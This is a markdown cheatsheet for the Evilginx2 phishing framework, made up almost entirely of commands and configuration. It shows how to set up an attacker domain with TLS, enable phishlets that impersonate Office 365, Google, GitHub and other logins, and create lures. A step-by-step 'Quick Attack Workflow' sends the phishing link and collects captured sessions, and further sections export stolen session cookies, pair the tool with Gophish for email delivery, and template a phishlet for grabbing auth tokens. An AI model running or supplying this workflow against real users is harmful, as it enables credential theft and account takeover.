# Evilginx2 Cheatsheet

## Quick Start

```bash
# Start evilginx2
sudo evilginx2

# Set configuration
config domain attacker.com
config ip 203.0.113.10
config letsencrypt true
config letsencrypt email admin@attacker.com

# Enable phishlet
phishlets hostname o365 login.attacker.com
phishlets enable o365

# Create lure
lures create o365
lures set 0 redirect "https://www.office.com"
```

## Server Configuration

| Command | Description |
|---------|-------------|
| `config domain <domain>` | Set base phishing domain |
| `config ip <ip>` | Set external IP address |
| `config letsencrypt true` | Enable automatic TLS certificates |
| `config letsencrypt email <email>` | Set Let's Encrypt email |
| `config` | Show all configuration |

## Phishlet Management

| Command | Description |
|---------|-------------|
| `phishlets` | List all phishlets and status |
| `phishlets hostname <name> <host>` | Assign hostname to phishlet |
| `phishlets enable <name>` | Activate phishlet |
| `phishlets disable <name>` | Deactivate phishlet |
| `phishlets create <name> <file>` | Create new phishlet |
| `phishlets edit <name>` | Edit phishlet YAML |

## Lure Management

| Command | Description |
|---------|-------------|
| `lures` | List all lures |
| `lures create <phishlet>` | Create new lure |
| `lures set <id> redirect <url>` | Set post-capture redirect |
| `lures delete <id>` | Delete a lure |

## Session Management

| Command | Description |
|---------|-------------|
| `sessions` | List captured sessions |
| `sessions export <id>` | Export session cookies |
| `sessions delete <id>` | Delete a session |

## LetsEncrypt Management

| Command | Description |
|---------|-------------|
| `letsencrypt` | List certificates |
| `letsencrypt sign <host>` | Request certificate |
| `letsencrypt revoke <host>` | Revoke certificate |

## Common Phishlets

| Phishlet | Target |
|----------|--------|
| `o365` | Microsoft Office 365 |
| `google` | Google Accounts |
| `outlook` | Outlook Web App |
| `github` | GitHub |
| `slack` | Slack |
| `twitter` | Twitter/X |
| `facebook` | Facebook |
| `linkedin` | LinkedIn |

## Quick Attack Workflow

```bash
# 1. Configure
config domain o365-evil.com
config ip 203.0.113.10
config letsencrypt true

# 2. Enable phishlet
phishlets hostname o365 login.o365-evil.com
phishlets enable o365

# 3. Create and configure lure
lures create o365
lures set 0 redirect "https://www.office.com"

# 4. Send phishing link
echo "https://login.o365-evil.com/0"

# 5. Monitor for captures
sessions
```

## Multi-Target Setup

```bash
# Multiple phishlets simultaneously
phishlets hostname o365 login1.attacker.com
phishlets hostname google login2.attacker.com
phishlets hostname github login3.attacker.com

phishlets enable o365
phishlets enable google
phishlets enable github
```

## Debugging

```bash
# Start with debug output
sudo evilginx2 -debug

# Custom paths
sudo evilginx2 -p /opt/phishlets -c /opt/config

# Developer mode (self-signed certs)
sudo evilginx2 -developer
```

## Gophish Integration

```bash
# Use Gophish fork with Evilginx2 support
git clone https://github.com/kgretzky/gophish.git
cd gophish && go build

# Configure Gophish to use Evilginx2 lure URLs
# Gophish handles email delivery
# Evilginx2 handles credential capture
```

## Cookie Export Formats

```bash
# Export for browser extension
sessions export 0 --format=firefox
sessions export 0 --format=chrome

# Export for curl
sessions export 0 --format=curl
```

## DNS Setup

```
attacker.com.    NS    ns1.attacker.com.
ns1.attacker.com.  A    203.0.113.10
login.attacker.com. A   203.0.113.10
```

## Phishlet YAML Structure

```yaml
name: "example"
author: "attacker"
min_version: "2.3.0"

sub_filters:
  - trigger: "target.com"
    replace: "target.attacker.com"
    sub: true

auth_tokens:
  - domain: ".target.com"
    key: "session_id"
    type: "URL"

auth_urls:
  - "target.com/auth/callback"

login:
  domain: "target.com"
  path: "/login"
```

## Port Requirements

| Port | Protocol | Service |
|------|----------|---------|
| 53 | UDP/TCP | DNS server |
| 80 | TCP | HTTP (Let's Encrypt validation) |
| 443 | TCP | HTTPS (phishing pages) |

## Troubleshooting

```bash
# Port 53 in use
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# TLS issues
letsencrypt
letsencrypt sign login.attacker.com

# Phishlet not loading
phishlets edit myphish
# Check YAML syntax

# Cookies not captured
# Enable debug mode and check auth_tokens in phishlet
sudo evilginx2 -debug
```
